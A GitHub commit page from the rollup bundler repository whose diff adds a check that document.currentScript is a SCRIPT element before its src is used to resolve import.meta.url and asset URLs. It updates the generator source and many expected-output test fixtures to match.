* Loading branch information

[![@lukastaegert](https://avatars.githubusercontent.com/u/12949268?s=40&v=4)](/lukastaegert)

[lukastaegert](/rollup/rollup/commits?author=lukastaegert "View all commits by lukastaegert")
committed
Sep 21, 2024

1 parent
[a6448b9](/rollup/rollup/commit/a6448b99f725d457e35821b73a865b5c4d4c6a61)

commit 2ef77c0

 Show file tree

 Hide file tree

Showing
**39 changed files**
with
**87 additions**
and
**86 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* src/ast/nodes

  + src/ast/nodes/MetaProperty.ts
    [MetaProperty.ts](#diff-ead526444ffa2c8ec92192d0d869c8405cc011b7e098048c17a01d718e789a6e)
* test

  + chunking-form/samples

    - asset-needs-code-reference/\_expected/cjs

      * test/chunking-form/samples/asset-needs-code-reference/\_expected/cjs/main.js
        [main.js](#diff-3cc5f5a8b48302716a9341ddb583faa7b10bd17955ccbe5f6cba6caef2742c6e)
    - emit-file

      * emit-chunk-with-importer/\_expected/cjs

        + test/chunking-form/samples/emit-file/emit-chunk-with-importer/\_expected/cjs/main.js
          [main.js](#diff-fb51b0329ea05ac075795f4208c82cf9b1bb94051e2ccd49d087537d53b462f0)
      * emit-chunk-worker/\_expected/cjs

        + chunks

          - test/chunking-form/samples/emit-file/emit-chunk-worker/\_expected/cjs/chunks/nested.js
            [nested.js](#diff-61f3b09538a59aa0c1a0f31e57bf719045962f99176b5c02f9e573278a18beec)
          - test/chunking-form/samples/emit-file/emit-chunk-worker/\_expected/cjs/chunks/worker-proxy.js
            [worker-proxy.js](#diff-96f4a25268a3b95f9c7df910cd93e105b23f8ee88bfa46adf94b2419e9bc0fc5)
        + test/chunking-form/samples/emit-file/emit-chunk-worker/\_expected/cjs/main.js
          [main.js](#diff-d126a8d46fea2c6147c4ec0db8d82fb9429882e6795b9c09daccc4e193934685)
      * emit-chunk-worklet/\_expected/cjs

        + test/chunking-form/samples/emit-file/emit-chunk-worklet/\_expected/cjs/main.js
          [main.js](#diff-f80d58d0fd5f68eab5e1d9a528db706c7bf036647087bb7e1f5966c840210f55)
      * reference-files/\_expected/cjs

        + test/chunking-form/samples/emit-file/reference-files/\_expected/cjs/main.js
          [main.js](#diff-016a8c84f1219e6a16e82575e0d47cfcbb796caae8d6247831bc7964e286f8ba)
        + nested

          - test/chunking-form/samples/emit-file/reference-files/\_expected/cjs/nested/chunk.js
            [chunk.js](#diff-826917577ab8d66ed860b11ecb1a6d0ad98b31a12a8e2de1eb8a94fd593e3e28)
      * set-asset-source/\_expected/cjs

        + test/chunking-form/samples/emit-file/set-asset-source/\_expected/cjs/main.js
          [main.js](#diff-b7be29ac86c993f2bc6070667f74fcf7c02133d55e5b22c752d9c9da0d87243d)
    - import-meta-numeric-paths/\_expected/cjs/0/1

      * test/chunking-form/samples/import-meta-numeric-paths/\_expected/cjs/0/1/nested.js
        [nested.js](#diff-530baddf14ec34e0f25ccd31994e16882458811a631bafd1a232e70f6220d304)
    - import-meta-url/\_expected/cjs

      * test/chunking-form/samples/import-meta-url/\_expected/cjs/main.js
        [main.js](#diff-156cb4dfce91ed62349135cf8cf61c8e471c5e841ef959eeb7b728e316bcb328)
      * nested

        + test/chunking-form/samples/import-meta-url/\_expected/cjs/nested/chunk.js
          [chunk.js](#diff-0fddcdeb8046d35369fd7e540d029cb7929e8052f281b927a1082221374a2464)
    - render-chunk/\_expected/cjs

      * test/chunking-form/samples/render-chunk/\_expected/cjs/chunk-dep2-e49c5bba.js
        [chunk-dep2-e49c5bba.js](#diff-53a8b5a1bbcc369609a8b84cad9bfc9a8a58eb93af851fa328091baa1a2695b5)
      * test/chunking-form/samples/render-chunk/\_expected/cjs/entry-main1-31317016.js
        [entry-main1-31317016.js](#diff-fa44d8407c8b3789d5b327f8b01bd9c7df19d6391e8d5b6b1c6f95d169e3a603)
      * test/chunking-form/samples/render-chunk/\_expected/cjs/entry-main2-f63e5752.js
        [entry-main2-f63e5752.js](#diff-fb70bd2c4c8d4fa42adfc97cecee04bf40dc4d3a9bf3ab00e577b15ee9ad2af4)
    - resolve-file-url/\_expected/cjs

      * test/chunking-form/samples/resolve-file-url/\_expected/cjs/main.js
        [main.js](#diff-5dfcc9ce0f4f4b15b467fb57889a820be6a3b0f1603192611b4e55b4b08d45c3)
  + form/samples

    - configure-file-url/\_expected

      * test/form/samples/configure-file-url/\_expected/cjs.js
        [cjs.js](#diff-6310a9f03aa177327fa4ac34ac7bf4c8583fdf0fbe915b331e73fd20640cd0cf)
      * test/form/samples/configure-file-url/\_expected/iife.js
        [iife.js](#diff-0ad908f884b62d0e43c75d4cd33595bec29a73624fcdddcd59e54857262cbb0b)
      * test/form/samples/configure-file-url/\_expected/umd.js
        [umd.js](#diff-5164ceb2b5fb1bfdaccf3cfb21c0a7388f375e962b445c56bd6037b1c41b92ee)
    - deconflict-format-specific-globals/\_expected

      * test/form/samples/deconflict-format-specific-globals/\_expected/cjs.js
        [cjs.js](#diff-547cde11332116e0e639352a13c38c3dcf0265361e0ff3326ce6db865bcb484b)
      * test/form/samples/deconflict-format-specific-globals/\_expected/iife.js
        [iife.js](#diff-df4008372f5a3cf2438c85443fa10f9bfa4234f9bd2d54ff218681e7a14d74e6)
      * test/form/samples/deconflict-format-specific-globals/\_expected/umd.js
        [umd.js](#diff-4e2e55c5a59cc32961af661478f396e9f1b0aed6c547e6ca38dbcc4b5aa66baf)
    - emit-asset-file/\_expected

      * test/form/samples/emit-asset-file/\_expected/cjs.js
        [cjs.js](#diff-b5e7f6d052f0fec8f3e4aca7656026ada27b695d109bb1512b895545de23931e)
      * test/form/samples/emit-asset-file/\_expected/iife.js
        [iife.js](#diff-c4c9a44949f6358f63c8bb2e6ef409e1aebdbe5ab60570eab77a9a7cd6c78748)
      * test/form/samples/emit-asset-file/\_expected/umd.js
        [umd.js](#diff-27eaf1aa6188accc40a83e3cef5158af21340cd49281ae24a32a4309b994d886)
    - emit-uint8array-no-buffer/\_expected

      * test/form/samples/emit-uint8array-no-buffer/\_expected/cjs.js
        [cjs.js](#diff-ede41810325317eec86b5cc2d247d842073b8123a1bb36eb9540409c2cdf49b4)
      * test/form/samples/emit-uint8array-no-buffer/\_expected/iife.js
        [iife.js](#diff-d70090a63f058e765b66d3890832fe1ba8cc132b299d0adeea29512822e69b46)
      * test/form/samples/emit-uint8array-no-buffer/\_expected/umd.js
        [umd.js](#diff-993bfde6ae70d42d1a02884f8f30817b908f59c4f27e0d23cd26de825fb14447)
    - import-meta-url/\_expected

      * test/form/samples/import-meta-url/\_expected/cjs.js
        [cjs.js](#diff-c93fab6e98a34c1512fff5b043bcb711f129a79cee3b07e8486bf3d2026a0d92)
      * test/form/samples/import-meta-url/\_expected/iife.js
        [iife.js](#diff-65722237e02921be1eab29042301559260b24d767f884b109bfbbbc74ccc6cde)
      * test/form/samples/import-meta-url/\_expected/umd.js
        [umd.js](#diff-d8b31362903eee1eb765ec23e49eebe00dcbc99cea3b9f11967f16063db0bf7a)
    - import-meta/\_expected

      * test/form/samples/import-meta/\_expected/cjs.js
        [cjs.js](#diff-f89917092127b39cf615f44cbd0909581b1fb2a112623a44adb66064b3e88c12)
      * test/form/samples/import-meta/\_expected/iife.js
        [iife.js](#diff-8d4af18cc4996e681a1a4a117fa924ae35bdff7c40fcd07b79889be71bf1b445)
      * test/form/samples/import-meta/\_expected/umd.js
        [umd.js](#diff-5bbfc62d51c906bfff6d8909c503769e5837c9d5db2346a5c7941f241ff659bd)
    - resolve-import-meta-url/\_expected

      * test/form/samples/resolve-import-meta-url/\_expected/cjs.js
        [cjs.js](#diff-59b4800525823c4ca033a634cedec97f140af13d3ab6547a39e8d0bca5d9ea5b)
      * test/form/samples/resolve-import-meta-url/\_expected/iife.js
        [iife.js](#diff-a18610825fc57c2251da7fe148769446e94a8633cc58c47030be2d1b18978b35)
      * test/form/samples/resolve-import-meta-url/\_expected/umd.js
        [umd.js](#diff-131428909e24ee36644f1a488a237dec31355a8efe4d784844f7a42f8dadc910)
  + function/samples/import-meta-url-b

    - test/function/samples/import-meta-url-b/\_config.js
      [\_config.js](#diff-b73ccac5b991681c061f2f838b50ee5c26de2af94fa21af8e7d90300b4b66641)

## There are no files selected for viewing

4 changes: 2 additions & 2 deletions

4
[src/ast/nodes/MetaProperty.ts](#diff-ead526444ffa2c8ec92192d0d869c8405cc011b7e098048c17a01d718e789a6e "src/ast/nodes/MetaProperty.ts")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/src/ast/nodes/MetaProperty.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -156,7 +156,7 @@ const getRelativeUrlFromDocument = (relativePath: string, umd = false) => |
|  |  | getResolveUrl( |
|  |  | `'${escapeId(relativePath)}', ${ |
|  |  | umd ? `typeof document === 'undefined' ? location.href : ` : '' |
|  |  | }document.currentScript && document.currentScript.src || document.baseURI` |
|  |  | }document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI` |
|  |  | ); |
|  |  |  |
|  |  | const getGenericImportMetaMechanism = |
| Expand All | | @@ -178,7 +178,7 @@ const getFileUrlFromRelativePath = (path: string) => |
|  |  | const getUrlFromDocument = (chunkId: string, umd = false) => |
|  |  | `${ |
|  |  | umd ? `typeof document === 'undefined' ? location.href : ` : '' |
|  |  | }(${DOCUMENT\_CURRENT\_SCRIPT} && ${DOCUMENT\_CURRENT\_SCRIPT}.src || new URL('${escapeId( |
|  |  | }(${DOCUMENT\_CURRENT\_SCRIPT} && ${DOCUMENT\_CURRENT\_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' && ${DOCUMENT\_CURRENT\_SCRIPT}.src || new URL('${escapeId( |
|  |  | chunkId |
|  |  | )}', document.baseURI).href)`; |
|  |  |  |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/asset-needs-code-reference/\_expected/cjs/main.js](#diff-3cc5f5a8b48302716a9341ddb583faa7b10bd17955ccbe5f6cba6caef2742c6e "test/chunking-form/samples/asset-needs-code-reference/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/asset-needs-code-reference/_expected/cjs/main.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,6 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | var asset2 = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/logo2.svg').href : new URL('logo2.svg', document.currentScript && document.currentScript.src || document.baseURI).href); |
|  |  | var asset2 = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/logo2.svg').href : new URL('logo2.svg', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href); |
|  |  |  |
|  |  | { |
|  |  | const image = document.createElement('img'); |
| Expand Down | |  |

6 changes: 3 additions & 3 deletions

6
[test/chunking-form/samples/emit-file/emit-chunk-with-importer/\_expected/cjs/main.js](#diff-fb51b0329ea05ac075795f4208c82cf9b1bb94051e2ccd49d087537d53b462f0 "test/chunking-form/samples/emit-file/emit-chunk-with-importer/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/emit-file/emit-chunk-with-importer/_expected/cjs/main.js)
Edit file

Delete file

Load diff

Some generated files are not rendered by default. Learn more about [how customized files appear on GitHub](https://docs.github.com/github/administering-a-repository/customizing-how-changed-files-appear-on-github).

Oops, something went wrong.

Retry

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/emit-file/emit-chunk-worker/\_expected/cjs/chunks/nested.js](#diff-61f3b09538a59aa0c1a0f31e57bf719045962f99176b5c02f9e573278a18beec "test/chunking-form/samples/emit-file/emit-chunk-worker/_expected/cjs/chunks/nested.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/emit-file/emit-chunk-worker/_expected/cjs/chunks/nested.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,7 +1,7 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | const getWorkerMessage = () => new Promise(resolve => { |
|  |  | const worker = new Worker((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/worker-proxy.js').href : new URL('worker-proxy.js', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | const worker = new Worker((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/worker-proxy.js').href : new URL('worker-proxy.js', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |
|  |  | worker.onmessage = resolve; |
|  |  | }); |
|  |  |  |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/emit-file/emit-chunk-worker/\_expected/cjs/chunks/worker-proxy.js](#diff-96f4a25268a3b95f9c7df910cd93e105b23f8ee88bfa46adf94b2419e9bc0fc5 "test/chunking-form/samples/emit-file/emit-chunk-worker/_expected/cjs/chunks/worker-proxy.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/emit-file/emit-chunk-worker/_expected/cjs/chunks/worker-proxy.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,3 +1,3 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | PLACEHOLDER((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/worker.js').href : new URL('worker.js', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | PLACEHOLDER((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/worker.js').href : new URL('worker.js', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/emit-file/emit-chunk-worker/\_expected/cjs/main.js](#diff-d126a8d46fea2c6147c4ec0db8d82fb9429882e6795b9c09daccc4e193934685 "test/chunking-form/samples/emit-file/emit-chunk-worker/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/emit-file/emit-chunk-worker/_expected/cjs/main.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3,7 +3,7 @@ |
|  |  | var shared = require('./chunks/shared.js'); |
|  |  |  |
|  |  | const getWorkerMessage = () => new Promise(resolve => { |
|  |  | const worker = new Worker((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/chunks/worker-proxy.js').href : new URL('chunks/worker-proxy.js', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | const worker = new Worker((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/chunks/worker-proxy.js').href : new URL('chunks/worker-proxy.js', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |
|  |  | worker.onmessage = resolve; |
|  |  | }); |
|  |  |  |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/emit-file/emit-chunk-worklet/\_expected/cjs/main.js](#diff-f80d58d0fd5f68eab5e1d9a528db706c7bf036647087bb7e1f5966c840210f55 "test/chunking-form/samples/emit-file/emit-chunk-worklet/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/emit-file/emit-chunk-worklet/_expected/cjs/main.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2,6 +2,6 @@ |
|  |  |  |
|  |  | var shared = require('./chunks/shared.js'); |
|  |  |  |
|  |  | CSS.paintWorklet.addModule((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/chunks/worklet.js').href : new URL('chunks/worklet.js', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | CSS.paintWorklet.addModule((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/chunks/worklet.js').href : new URL('chunks/worklet.js', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |
|  |  |  |
|  |  | document.body.innerHTML += `<h1 style="background-image: paint(vertical-lines);">color: ${shared.color}, size: ${shared.size}</h1>`; |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/emit-file/reference-files/\_expected/cjs/main.js](#diff-016a8c84f1219e6a16e82575e0d47cfcbb796caae8d6247831bc7964e286f8ba "test/chunking-form/samples/emit-file/reference-files/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/emit-file/reference-files/_expected/cjs/main.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,6 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | var logo = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/assets/logo1-60bc15c4.svg').href : new URL('assets/logo1-60bc15c4.svg', document.currentScript && document.currentScript.src || document.baseURI).href); |
|  |  | var logo = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/assets/logo1-60bc15c4.svg').href : new URL('assets/logo1-60bc15c4.svg', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href); |
|  |  |  |
|  |  | function showImage(url) { |
|  |  | console.log(url); |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/emit-file/reference-files/\_expected/cjs/nested/chunk.js](#diff-826917577ab8d66ed860b11ecb1a6d0ad98b31a12a8e2de1eb8a94fd593e3e28 "test/chunking-form/samples/emit-file/reference-files/_expected/cjs/nested/chunk.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/emit-file/reference-files/_expected/cjs/nested/chunk.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2,6 +2,6 @@ |
|  |  |  |
|  |  | var main = require('../main.js'); |
|  |  |  |
|  |  | var logo = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/../assets/logo2-fdaa7478.svg').href : new URL('../assets/logo2-fdaa7478.svg', document.currentScript && document.currentScript.src || document.baseURI).href); |
|  |  | var logo = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/../assets/logo2-fdaa7478.svg').href : new URL('../assets/logo2-fdaa7478.svg', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href); |
|  |  |  |
|  |  | main.showImage(logo); |

16 changes: 8 additions & 8 deletions

16
[test/chunking-form/samples/emit-file/set-asset-source/\_expected/cjs/main.js](#diff-b7be29ac86c993f2bc6070667f74fcf7c02133d55e5b22c752d9c9da0d87243d "test/chunking-form/samples/emit-file/set-asset-source/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/emit-file/set-asset-source/_expected/cjs/main.js)
Edit file

Delete file

Load diff

Some generated files are not rendered by default. Learn more about [how customized files appear on GitHub](https://docs.github.com/github/administering-a-repository/customizing-how-changed-files-appear-on-github).

Oops, something went wrong.

Retry

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/import-meta-numeric-paths/\_expected/cjs/0/1/nested.js](#diff-530baddf14ec34e0f25ccd31994e16882458811a631bafd1a232e70f6220d304 "test/chunking-form/samples/import-meta-numeric-paths/_expected/cjs/0/1/nested.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/import-meta-numeric-paths/_expected/cjs/0/1/nested.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,6 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | var \_documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null; |
|  |  | const url = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_filename).href : (\_documentCurrentScript && \_documentCurrentScript.src || new URL('0/1/nested.js', document.baseURI).href)); |
|  |  | const url = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_filename).href : (\_documentCurrentScript && \_documentCurrentScript.tagName.toUpperCase() === 'SCRIPT' && \_documentCurrentScript.src || new URL('0/1/nested.js', document.baseURI).href)); |
|  |  |  |
|  |  | exports.url = url; |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/import-meta-url/\_expected/cjs/main.js](#diff-156cb4dfce91ed62349135cf8cf61c8e471c5e841ef959eeb7b728e316bcb328 "test/chunking-form/samples/import-meta-url/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/import-meta-url/_expected/cjs/main.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -9,7 +9,7 @@ function log(url) { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | log('main: ' + (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_filename).href : (\_documentCurrentScript && \_documentCurrentScript.src || new URL('main.js', document.baseURI).href))); |
|  |  | log('main: ' + (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_filename).href : (\_documentCurrentScript && \_documentCurrentScript.tagName.toUpperCase() === 'SCRIPT' && \_documentCurrentScript.src || new URL('main.js', document.baseURI).href))); |
|  |  | Promise.resolve().then(function () { return require('./nested/chunk.js'); }); |
|  |  |  |
|  |  | exports.log = log; |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/import-meta-url/\_expected/cjs/nested/chunk.js](#diff-0fddcdeb8046d35369fd7e540d029cb7929e8052f281b927a1082221374a2464 "test/chunking-form/samples/import-meta-url/_expected/cjs/nested/chunk.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/import-meta-url/_expected/cjs/nested/chunk.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3,4 +3,4 @@ |
|  |  | var main = require('../main.js'); |
|  |  |  |
|  |  | var \_documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null; |
|  |  | main.log('nested: ' + (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_filename).href : (\_documentCurrentScript && \_documentCurrentScript.src || new URL('nested/chunk.js', document.baseURI).href))); |
|  |  | main.log('nested: ' + (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_filename).href : (\_documentCurrentScript && \_documentCurrentScript.tagName.toUpperCase() === 'SCRIPT' && \_documentCurrentScript.src || new URL('nested/chunk.js', document.baseURI).href))); |

10 changes: 5 additions & 5 deletions

10
[...hunk/\_expected/cjs/chunk-dep2-8d89c265.js → ...hunk/\_expected/cjs/chunk-dep2-e49c5bba.js](#diff-53a8b5a1bbcc369609a8b84cad9bfc9a8a58eb93af851fa328091baa1a2695b5 "test/chunking-form/samples/render-chunk/_expected/cjs/chunk-dep2-8d89c265.js → test/chunking-form/samples/render-chunk/_expected/cjs/chunk-dep2-e49c5bba.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/render-chunk/_expected/cjs/chunk-dep2-e49c5bba.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,7 +1,7 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | var num = 2; |
|  |  | console.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-9f86d081').href : new URL('asset-test-9f86d081', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | console.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-9f86d081').href : new URL('asset-test-9f86d081', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |
|  |  |  |
|  |  | exports.num = num; |
|  |  | console.log({ |
| Expand All | | @@ -18,24 +18,24 @@ console.log({ |
|  |  | "name": "dep2", |
|  |  | "type": "chunk", |
|  |  | "dynamicImports": [], |
|  |  | "fileName": "chunk-dep2-8d89c265.js", |
|  |  | "fileName": "chunk-dep2-e49c5bba.js", |
|  |  | "implicitlyLoadedBefore": [], |
|  |  | "importedBindings": {}, |
|  |  | "imports": [], |
|  |  | "modules": { |
|  |  | "\*\*/dep2.js": { |
|  |  | "code": "var num = 2;\nconsole.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-9f86d081').href : new URL('asset-test-9f86d081', document.currentScript && document.currentScript.src || document.baseURI).href));", |
|  |  | "code": "var num = 2;\nconsole.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-9f86d081').href : new URL('asset-test-9f86d081', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href));", |
|  |  | "originalLength": 19, |
|  |  | "removedExports": [], |
|  |  | "renderedExports": [ |
|  |  | "num" |
|  |  | ], |
|  |  | "renderedLength": 269 |
|  |  | "renderedLength": 330 |
|  |  | } |
|  |  | }, |
|  |  | "referencedFiles": [ |
|  |  | "asset-test-9f86d081" |
|  |  | ] |
|  |  | }); |
|  |  | console.log('all chunks', ["entry-main1-5be92ae4.js","entry-main2-20c5a0f4.js","chunk-dep2-8d89c265.js"]) |
|  |  | console.log('all chunks', ["entry-main1-31317016.js","entry-main2-f63e5752.js","chunk-dep2-e49c5bba.js"]) |
|  |  | console.log('referenced asset in renderChunk', 'asset-test-9f86d081'); |

22 changes: 11 additions & 11 deletions

22
